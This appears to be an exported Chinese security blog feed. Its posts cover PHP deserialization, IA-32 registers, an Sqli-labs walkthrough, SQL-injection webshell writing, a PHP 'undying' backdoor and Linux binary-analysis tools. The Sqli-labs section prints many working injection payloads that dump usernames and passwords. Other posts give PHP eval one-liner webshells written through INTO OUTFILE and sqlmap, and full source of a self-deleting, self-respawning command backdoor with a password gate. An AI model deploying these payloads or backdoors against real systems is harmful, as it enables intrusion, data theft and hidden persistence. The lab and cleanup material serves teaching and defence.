这里以PHP为例，Java的会在Java分类单独总结。 PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。 serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。 unserialize()：将序列化后的字符串反序列化成一个对象。 利用前提 unserialize()函数的参数可控； 代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类； 所写的内容需要有对象中的成员变量的值。 PHP魔法函数 下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。 __construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 __destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 __toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。 __sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。 _wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个\_wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 PHP反序列化漏洞分类 unserialize()反序列化漏洞 session反序列化漏洞 phar反序列化漏洞 二、检测方法以PHP为例，全局搜索PHP的反序列化函数如unserialize()，查看其中涉及的文件代码中是否含有魔法函数或其他危险的类方法，且进一步排查魔法函数的内容是否外界可控且存在危险操作。 三、防御方法1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则； 2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。 XPath注入一、基本概念漏洞定义 待完善… 二、检测方法待完善… 三、防御方法待完善… LDAP注入具体可参考技术详解：基于Web的LDAP注入漏洞 CRLF注入待完善… URL不安全重定向待完善… 点击劫持待完善… HTML5安全待完善… Web缓存攻击待完善…]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IA-32（Intel Architecture 32位）寄存器]]></title>
    <url>%2F2019%2F01%2F28%2FIA-32%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[通用寄存器用于传送和暂存数据，参与算数逻辑运算并保存运算结果。IA-32每个通用寄存器的大小都是32位，即4个字节，主要用来保存常量和地址等信息。 以下4个通用寄存器主要用于算术运算如ADD、SUB、XOR、OR等，常用于保存常量与变量的值。 EAX：（针对操作数和结果数据的）累加器，一般用在函数返回值中，所有Win32 API函数都会把返回值保存到EAX后再返回。EAX寄存器又分为高、低几个独立的寄存器，AX（0-15）为EAX（0-31）的低16位独立寄存器，而AX又分为高8位的AH（8-15）和低8位的AL（0-7）两个独立寄存器，下面的EBX、ECX和EDX同理。 EBX：（DS段中的数据指针）基址寄存器。 ECX：（字符串和循环操作的）计数器，如在循环命令LOOP中用来循环计数、每执行完一次循环ECX就自减一。 EDX：（I/O指针）数据寄存器。 以下4个通用寄存器主要用于保存内存地址的指针。 ESI：（字符串操作源指针）源变址寄存器。 EDI：（字符串操作目标指针）目的变址寄存器，ESI和EDI与特定指令（LODS、STOS、REP、MOVS等）一起使用，主要用于内存复制。 EBP：（SS段中栈内数据指针）扩展基址指针寄存器，表示栈区域的基地址，即指向栈最上面的一个栈帧的底部，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃（即栈帧技术）。 ESP：（SS段中栈指针）栈指针寄存器，指向栈区域的栈顶地址。 段寄存器在IA-32的保护模式中，段是一种内存保护技术，将内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等以保护内存。段内存记录在SDT中，而段寄存器持有这些SDT的索引。每个段寄存器的大小为16位，即2个字节，且每个段寄存器指向的段描述符与虚拟内存结合，形成一个线性地址，借助分页技术，线性地址最终被转换为实际的物理地址。 CS：Code Segment，代码段寄存器。 DS：Data Segment，数据段寄存器。 SS：Stack Segment，栈段寄存器。 ES：Extra (Data) Segment，附加（数据）段寄存器。 FS：Data Segment，数据段寄存器，在程序调试中经常用于计算SEH（结构化异常处理机制）、TEB（线程环境块）、PEB（进程环境块）。 GS：Data Segment，数据段寄存器。 其中ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。 程序状态与控制寄存器EFLAGS：Flag Register，标志寄存器，大小为4个字节即32位，每一位都有意义，有些位由系统直接设定，有些位则根据程序命令的执行结果设置。 先了解3个常用的与程序调试相关的标志，ZF（Zero Flag零标志）、OF（Overflow Flag溢出标志）、CF（Carry Flag进位标志）。 ZF：若运算结果为0，则为1（True），否则为0（False）。 OF：有符号整数溢出时，则为1。此外，MSB（最高有效位）改变时，也为1。 CF：无符号整数溢出时，则为1。 指令指针寄存器EIP：Instruction Pointer，指令指针寄存器，保存着CPU要执行的指令地址，大小为32位即4个字节。 程序运行时，CPU会读取EIP中的一条指令地址，传送指令到指令缓冲区后，EIP寄存器的值将自动增加，增加的大小为读取指令的字节大小。CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。 注意的就是，EIP寄存器和通用寄存器不同，不能直接修改EIP的值，只能通过其他指令间接修改，如JMP、Jcc、CALL、RET。也可以通过中断或者异常来修改EIP的值。]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqli-labs Less1-20]]></title>
    <url>%2F2019%2F01%2F01%2FSqli-labs-writeup%2F</url>
    <content type="text"><![CDATA[0x01 Less1-Less10参考旧博客文章《Sqli-labs之Less1-10》，个人觉得写得还算详细。 下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置： 12#To avoid warning messagessecure_file_priv="E:/wamp64/tmp" 解决办法直接将其置空即可。 再发一次payload，就能在当前目录访问生成的文件了： 1http://localhost/sqli/Less-7/?id=0&apos;)) union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users into outfile &quot;E:\\wamp64\\www\\sqli\\Less-7\\7.txt&quot; %23 0x02 Less11打开是个登录界面，可以输入用户名和密码，尝试输入admin’： 可以看到页面直接返回显示报错信息：’666’ LIMIT 0,1’ 再在password中尝试注入： 显示报错信息：’’666’’ LIMIT 0,1’ 由此推测后台SQL语句可能为：SELECT xx FROM XX WHRER username=’admin’ and password=’666’ LIMIT 0,1; 验证一下，这里用’ and 1=1#和’ and 1=2#来组合验证是行不通的，因为这并非和前面的level一样只有一个入参，而且这里我们本来就不知道正确的用户名和密码，因此后面再加and是无法判断的，那就直接用or： 没毛病，直接上payload： 1uname=admin&amp;passwd=666&apos; union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) from users#&amp;submit=Submit 最后看下源码的SQL语句，确实和推测的差不多： 1@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"; 0x03 Less12和level11一样的登录界面，在用户名处输入双引号后出现如下报错信息： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;666&quot;) LIMIT 0,1&apos; at line 1 推测后台SQL语句可能为：SELECT xx FROM XX WHRER username=(“admin”) and password=(“666”) LIMIT 0,1; 输入uname=admin”)&amp;passwd=666&amp;submit=Submit看到该报错信息即可验证： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;) and password=(&quot;666&quot;) LIMIT 0,1&apos; at line 1 payload： 1uname=admin&amp;passwd=666&quot;) union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) from users#&amp;submit=Submit 看下SQL语句源码： 1234// connectivity$uname='"'.$uname.'"';$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"; 0x04 Less13和level12一样，只是双引号换成了单引号，查询失败返回显示错误信息，但查询成功不返回显示任何字段内容。 由此可知，是，利用和level5类似，利用基于错误的SQL语句，如下面利用报错显示出数据库名： 1&apos;) union select 1,2 from(select count(*),concat_ws(char(32,58,32),database(),floor(rand()*2))name from information_schema.tables group by name)b# 直接上payload，其中若不使用group_concat则只要改下limit 0,1的第一个参数即可遍历所有变量： 12345') union select 1,2 from(select count(*),concat(char(32,58,32),(select group_concat(table_name) from information_schema.tables where table_schema='security'),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#') union select 1,2 from(select count(*),concat(char(32,58,32),(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#') union select 1,2 from(select count(*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b# 看下源码，注释掉了显示代码： 12345678910111213141516171819202122232425/ connectivity @$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo '&lt;font color= "#0000ff"&gt;'; echo "&lt;br&gt;"; echo '&lt;font color= "#FFFF00" font size = 4&gt;'; //echo " You Have successfully logged in " ; echo '&lt;font size="3" color="#0000ff"&gt;'; echo "&lt;br&gt;"; //echo 'Your Login name:'. $row['username']; //echo "&lt;br&gt;"; //echo 'Your Password:' .$row['password']; //echo "&lt;br&gt;"; echo "&lt;/font&gt;"; echo "&lt;br&gt;"; echo "&lt;br&gt;"; echo '&lt;img src="../images/flag.jpg" /&gt;'; echo "&lt;/font&gt;"; &#125; 0x05 Less14和less13原理一样，都是利用基于错误的SQL语句，只不过不是’)而是”双引号： 1uname=admin&amp;passwd=666&quot; union select 1,2 from(select count(*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#&amp;submit=Submit 看下源码SQL语句： 123$uname='"'.$uname.'"';$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"; 0x06 Less15测试几下，发现是基于布尔型的盲注，用单引号注入。 具体参考Less8即可，如下面用二分法爆破出DB名： 1uname=admin&amp;passwd=666&apos; or ascii(substr((select database()), 1, 1))&gt;114#&amp;submit=Submit 其他的步骤类似，不再赘述了。 看下源码，把输出都注释了： 12345678910111213141516171819202122232425// connectivity @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo '&lt;font color= "#0000ff"&gt;'; echo "&lt;br&gt;"; echo '&lt;font color= "#FFFF00" font size = 4&gt;'; //echo " You Have successfully logged in\n\n " ; echo '&lt;font size="3" color="#0000ff"&gt;'; echo "&lt;br&gt;"; //echo 'Your Login name:'. $row['username']; echo "&lt;br&gt;"; //echo 'Your Password:' .$row['password']; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; echo "&lt;br&gt;"; echo "&lt;br&gt;"; echo '&lt;img src="../images/flag.jpg" /&gt;'; echo "&lt;/font&gt;"; &#125; 0x07 Less16上Less15原理一致，只不过单引号变成”)注入： 1uname=admin&amp;passwd=666&quot;) or ascii(substr((select database()), 1, 1))&gt;114#&amp;submit=Submit 其他的步骤类似，不再赘述了。 看下源码，把输出都注释了： 123456789101112131415161718192021222324252627// connectivity $uname='"'.$uname.'"'; $passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo '&lt;font color= "#0000ff"&gt;'; echo "&lt;br&gt;"; echo '&lt;font color= "#FFFF00" font size = 4&gt;'; //echo " You Have successfully logged in " ; echo '&lt;font size="3" color="#0000ff"&gt;'; echo "&lt;br&gt;"; //echo 'Your Login name:'. $row['username']; echo "&lt;br&gt;"; //echo 'Your Password:' .$row['password']; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; echo "&lt;br&gt;"; echo "&lt;br&gt;"; echo '&lt;img src="../images/flag.jpg" /&gt;'; echo "&lt;/font&gt;"; &#125; 0x08 Less17这是一道UPDATE语句的SQL注入。 看界面，说是可以重置密码： 尝试在username和password中注入，发现在password中注入时会报错显示出来： 这里报错显示’admin’’。结合是重置密码的功能，可以推测出这里是UPDATE语句，从而退出后台SQL语句应该为：UPDATE users SET password=’xxx’ WHERE username=’admin’;。 验证一下，看下源码中SQL语句怎么写的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))&#123;//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];...// connectivity @$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) &#123; //echo '&lt;font color= "#0000ff"&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update="UPDATE users SET password = '$passwd' WHERE username='$row1'"; mysql_query($update); echo "&lt;br&gt;"; if (mysql_error()) &#123; echo '&lt;font color= "#FFFF00" font size = 3 &gt;'; print_r(mysql_error()); echo "&lt;/br&gt;&lt;/br&gt;"; echo "&lt;/font&gt;"; &#125; else &#123; echo '&lt;font color= "#FFFF00" font size = 3 &gt;'; //echo " You password has been successfully updated " ; echo "&lt;br&gt;"; echo "&lt;/font&gt;"; &#125; echo '&lt;img src="../images/flag1.jpg" /&gt;'; //echo 'Your Password:' .$row['password']; echo "&lt;/font&gt;"; &#125; else &#123; echo '&lt;font size="4.5" color="#FFFF00"&gt;'; //echo "Bug off you Silly Dumb hacker"; echo "&lt;/br&gt;"; echo '&lt;img src="../images/slap1.jpg" /&gt;'; echo "&lt;/font&gt;"; &#125;&#125; 可以看到和推测的SQL语句一样，而且还看到程序对username进行了过滤，但并未过滤password。 那我们现在看看过滤函数的实现，看看能不能绕过从而实现username参数的注入： 1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = "'" . mysql_real_escape_string($value) . "'"; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 可以看到先判断参数是否为空，不为空则取前15位，然后调用get_magic_quotes_gpc()函数判断magic_quotes_gpc是否开启（返回0表示本功能关闭，返回1表示本功能打开），开启了的话（当magic_quotes_gpc打开时，所有的’(单引号)、”(双引号)、(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符）就调用stripslashes()删除由addslashes()函数添加的反斜杠；接着调用ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字（若是则返回TRUE，否则返回FALSE），当判断为非十进制数组时则调用mysql_real_escape_string()过滤参数。 可知，对username参数的过滤很有效，无从下手，只能对password进行注入了。 Method1——updatexml()函数函数定义： 1updatexml(xml_target,xpath_expr,new_xml) 参数 描述 xml_target 目标xml，形式类似于节点目录 xpath_expr xml的表达式（xpath格式） new_xml 用来替换的xml updatexml()函数是MySQL对xml文档数据进行查询和修改的xpath函数。 简单来说就是，用new_xml把xml_target中包含xpath_expr的部分节点（包括xml_target）替换掉。 使用该函数的注入原理是主要是利用报错返回信息。将updatexml()的xml_target和new_xml参数随便设定一个数即可。利用updatexml()获取数据的固定payload是： 1... or updatexml(1,concat(&apos;#&apos;,(select * from (select ...) a)),0) ... 注入一下payload即可显示数据库信息，其中0x2b为+号，当然可以用单引号直接括起来添加： 123uname=admin&amp;passwd=666&apos; or updatexml(1,concat(&apos;+&apos;,(select database()),&apos;+&apos;),0)#&amp;submit=Submit或uname=admin&amp;passwd=666&apos; or updatexml(1,concat(0x2b,(select database()),0x2b),0)#&amp;submit=Submit 报错显示出数据库名了，接着爆出表名吧，一开始输入如下payload虽然执行成功但没有显示报错内容： 1uname=admin&amp;passwd=666&apos; or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),0)#&amp;submit=Submit 后面测试了一番，发现将or换成and就可以了： 123或uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x2b),0)#&amp;submit=Submit 然后查询列名： 1uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),0x2b),0)#&amp;submit=Submit 最后本该列出所以该数据库表信息的，但是报错了： 1uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select group_concat(concat_ws(char(32,58,32),id,username,password)) from users),0x2b),0)#&amp;submit=Submit 不能先select表中的某些值，再update这个表（在同一语句中）。 解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误。 注意：此问题只出现于MySQL，msSQL和Oracle不会出现此问题。 最后需要我们再加一层select查询，然后加上别名（这里示例写了test）才能正常拿到password： 1uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select * from (select concat_ws(&apos;:&apos;,id,username,password) from users limit 0,1) test),0x2b),0)#&amp;submit=Submit 这里示例是通过limit遍历各个用户的密码，使用group_concat这里是测试不通过的。 Method2——extractvalue()函数原理和用法跟updatexml()函数几乎一样，只是少了第三个参数： 1extractvalue(xml,value) extractvalue()函数也是MySQL 5.1以后推出的对xml文档数据进行查询和修改的xpath函数。 extractvalue()的xml参数随便设定一个数。利用extractvalue()获取数据的固定payload是： 1... or extractvalue(1,concat(&apos;#&apos;,(select * from (select ....) a)))--+ 直接上payload： 1uname=admin&amp;passwd=666&apos; and extractvalue(1,concat(0x2b,(select * from (select concat_ws(&apos;:&apos;,id,username,password) from users limit 0,1) test),0x2b))#&amp;submit=Submit Method3——floor()函数报错显示数据库名： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat(database(),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit 接着可以使用group_concat列出所有表名： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit 列出列名： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit 最后获取数据库信息时，通过group_concat是不成功的，只能利用limit遍历出来： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat((select concat_ws(&apos;:&apos;,id,username,password) from users limit 0,1),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit Method4——基于时间的盲注开始时尝试的盲注老有问题，于是参考了sqlmap是怎么注入的： 1234Type: AND/OR time-based blindTitle: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)Payload: uname=admin&amp;passwd=666&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))hHwh)-- thmc&amp;submit=SubmitVector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) 可以看到，sqlmap中基于时间的盲注是基于Double Select注入，在其中结合sleep以及if来实现注入的。具体的实现如下，逐个字符猜测，当猜测正确时页面是sleep 10秒，否则马上响应： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr(database(),1,1))=115,0,10))) )mi1k7ea)#&amp;submit=Submit 这里ASCII码155对应字符s，逐个字符推出数据库名为security。 接着推出表名，ASCII码117对应字符u，这里直接推出limit 2,1为users表的开始： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1))=117,0,10))) )mi1k7ea)#&amp;submit=Submit 接着推字段，ASCII码105为字符i，这里可推出第一个字段名为id： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=105,0,10))) )mi1k7ea)#&amp;submit=Submit 最后就是爆表的内容了，ASCII码48为字符0，我本地的admin密码现在是0： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr((select password from users where username=&apos;admin&apos;),1,1))=48,0,10))) )mi1k7ea)#&amp;submit=Submit Method5——name_const()函数只适用于MySQL版本高于5.0.12，但又稍旧的版本。不适用于现在的5.7版本，会显示Incorrect arguments to NAME_CONST。 函数定义： 1name_const(name,value) 返回给定值，当用来产生一个结果集合列时，name_const()促使该列使用给定名称。 获取数据库名： 1666&apos; and (SELECT * FROM (SELECT name_const(database(),1),name_const(database(),1)) a) WHERE username=&apos;admin&apos;# 获取表名： 1666&apos; and (SELECT * FROM (SELECT name_const((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;security&apos;),1),name_const((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;security&apos;),1)) a)# 总的来说，对于update、delete和insert都有一个固定的结构： 1... or (select * from (select name_const((select ...),1),name_const((select ...),1)) a) ... 0x09 Less18访问页面，有个登录框和显示ip地址一栏信息： 尝试一番操作，在username和password都没有疑似SQL注入的问题。 其实本页面的标题已经提示我们是HTTP头注入了。]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入写WebShell方式小结]]></title>
    <url>%2F2019%2F01%2F01%2FSQL%E6%B3%A8%E5%85%A5%E5%86%99WebShell%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[这里小结一下通过SQL注入写入WebShell的方法。 通过SQL注入select into outfile实现，如： 1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’# 前提都是需要对目标目录具有写权限。 –os-cmd=”net user”交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。 ##–os-shell写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。注意:关闭sqlmap文件就会被删除。 ##本地写入webshell先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。 注意需要最高权限。 MySQL写木马，通常可以通过phpmyadmin来实现。 前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。 1、创建一个表 CREATE TABLE a (cmd text NOT NULL); 2、插入数据 INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’); 3、导出一句话 SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’; 4、删除表 Drop TABLE IF EXISTS a;]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP内存型木马]]></title>
    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>AWD</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux环境与相关工具]]></title>
    <url>%2F2019%2F01%2F01%2FLinux%E7%8E%AF%E5%A2%83%E4%B8%8E%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[这里小结一下Linux二进制分析相关的环境与工具的基础知识。 Linux工具Linux自带了很多常用的binutils工具，这些工具可在以下的URL中找到，其中包含许多用于二进制分析和破解的工具：http://www.gnu.org/software/binutils/ GDBGNU Debuger，具体的不用多说。 GNU binutils中的objdumpobject dump是一种对代码进行快速反编译的简介方案，在反编译简单的、未被篡改的二进制文件时较为有用，可以读取常用的ELF类型文件，但对于如恶意软件等较为复杂的反编译任务则显得局限。 主要缺点是需要依赖ELF节头，并且不会进行控制流分析。 一些常见用例： 查看ELF文件中所有节的数据或代码： objdump -D \ 只查看ELF文件中的程序代码： objdump -d \ 查看所有符号： objdump -tf \ GNU binutils中的objcopyobject copy将目标文件的一部分或者全部内容拷贝到另外一个目标文件中，或者实现目标文件的格式转换。其可以分析和修改任意类型的ELF文件，修改ELF节，复制ELF节到ELF二进制中或反之。 要将.data节从一个ELF文件复制到另一个文件中可用以下命令： objcopy -only-section=.data \ \ stracesystem call trace系统调用追踪，是基于ptrace(2)系统调用的工具，通过在一个循环中使用PTRACE_SYSCALL请求来显示运行中程序的系统调用syscalls活动相关的信息以及程序执行中捕获到的信号量。 跟踪程序： strace /bin/ls -o ls.out 附加到一个现存的进程上： strace -p \ -o daemon.out 原始输出将会显示每个系统调用的文件描述编号，系统调用会将文件描述符作为参数，如下： SYS_read(3, buf, sizeof(buf)); 若想查看读入到文件描述符3中的所有数据，可执行如下命令： strace -e read=3 /bin/ls 也可以使用-e write=fd命令查看写入的数据。 ltracelibrary trace库追踪，与strace类似，用于解析共享库即一个程序的链接信息，并打印出用到的库函数。还可以使用-S参数查看系统调用。该命令通过解析可执行文件的动态段，并打印出共享库和静态库的实际符号和函数来提供更详细的信息。 ltrace \ -o program.out ftracefunction trace函数追踪，与ltrace类似，另外还可以查看二进制文件本身的函数调用，可以在以下URL下载：https://github.com/elfmaster/ftrace readelfreadelf是用于解析ELF二进制文件的工具。在进行反编译之前，需要手机目标文件相关的信息，该命令可以提供收集信息所需要的特定的ELF的所有数据。 查询节头表：readelf -S \ 查询程序头表：readelf -l \ 查询符号表：readelf -s \ 查询ELF文件头数据：readelf -e \ 查询重定位入口：readelf -r \ 查询动态段：readelf -d \ ERESI——ELF反编译系统接口ERESI工程包含了许多Linux二进制工具，具体查看http://www.eresi-project.org 设备和文件/proc/&lt;pid&gt;/maps/proc/\/maps文件保存了一个进程镜像的布局，通过展现每个内存映射来实现，展现的内容包括可执行文件、共享库、栈、堆和VDSO等。对于快速解析一个进程的地址空间分布十分有用。 /proc/kcore/proc/kcore是proc文件系统的一项，是Linux内核的动态核心文件，是以ELF核心文件的形式所展现出来的原生内存转储。GDB可以使用/proc/kcore来对内核进行调试分析。 /boot/System.map该文件几乎存在于所有的Linux版本中，包含了整个内核的所有符号。 /proc/kallsyms/proc/kallsyms与/boot/System.map类似，/proc/kallsyms包含了内核中绝大部分的符号（若在CONFIG_KALLSYMS_ALL内核配置中指明则可以包含内核中全部的符号），区别是kallsyms是内核所属的/proc的一个入口并且可以动态更新。假如安装了新的LKM（Linux Kernel Module），符号会自动添加到/proc/kallsyms中。 /proc/iomem/proc/iomem是一个proc入口，与/proc/\/maps类似，不过其是跟系统内存相关的。 